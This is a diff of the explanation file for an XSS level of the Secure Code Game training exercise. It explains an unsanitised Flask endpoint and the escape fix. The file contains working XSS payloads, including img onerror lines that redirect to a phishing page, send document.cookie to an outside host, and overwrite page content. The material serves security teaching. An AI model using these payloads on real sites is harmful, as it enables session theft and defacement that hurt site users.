@@ -6,38 +6,28 @@ This code is vulnerable to Cross-Site Scripting (XSS).
 Learn more about Cross-Site Scripting (XSS): https://portswigger.net/web-security/cross-site-scripting
 Example from a security advisory: https://securitylab.github.com/advisories/GHSL-2023-084_Pay/ 
 
-Back to our level in the Secure Code Game, the vulnerable functions are:
-- get_planet_info()
-- get_planet_info_endpoint()
+Why the index() function it vulnerable to XSS?
 
-Why are they vulnerable?
-
-Examine closely the following:
-sanitized_planet = re.sub(r'[<>(){}[\]]', '', planet)
-
-In this regex, the characters 
-<, >, (, ), {, }, [, and ] 
-are explicitly removed, but whitespace characters are not removed.
-
+Firstly, the user input is not sanitized.
 Then, an anti-XSS defense is implemented, preventing inputs with the 'script' tag. 
-However, other tags, such as the 'img' tag, can still used to exploit a XSS bug as follows:
+However, other tags, such as the 'img' tag, can still be used to exploit a XSS bug as follows:
 
 Exploit: 
-<<img src="x" onerror="alert(1)">>
+<img src="x" onerror="alert(1)">
  
 Explanation: 
-In this payload, the double angle brackets, '<<' and '>>', will not be matched by the regex, 
-so the payload remains unaffected, and the XSS attack will execute successfully.
+With this payload, the XSS attack will execute successfully, since it will force the browser to open an 
+alert dialog box.
 
 How can we fix this?
-We can use the function 'escape', which is a built-in function inside the Markup module of Flask. 
+We can use the function 'escape', which is a built-in function inside the markup module used by Flask. 
 This function helps to escape special characters in the input, preventing them from being executed
 as HTML or JavaScript.
 
 Example: 
-from flask import Flask, request, render_template, jsonify, escape
+from markupsafe import escape
 
-return f'<h2>Planet Details:</h2><p>{escape(details)}</p>'
+return f'<h2>Planet Details:</h2><p>{escape(get_planet_info(planet))}</p>'
  
 What else can XSS do?
 - Steal cookies and session information
@@ -55,11 +45,11 @@ How to prevent XSS?
 Here are some exploit examples:
 
 - Redirect to phishing page using XSS:
-<<img src="x" onerror="window.location.href = 'https://google.com';">>
+<img src="x" onerror="window.location.href = 'https://google.com';">
 
 - Get cookies:
-<<img src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;">>
+<img src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;">
 
 - Modify website content:
 You can inject any phishing page, malicious page, or any other content to the website using XSS, by:
-<<img src="x" onerror="document.body.innerHTML = '<h1>Website is hacked</h1>';">>
+<img src="x" onerror="document.body.innerHTML = '<h1>Website is hacked</h1>';">
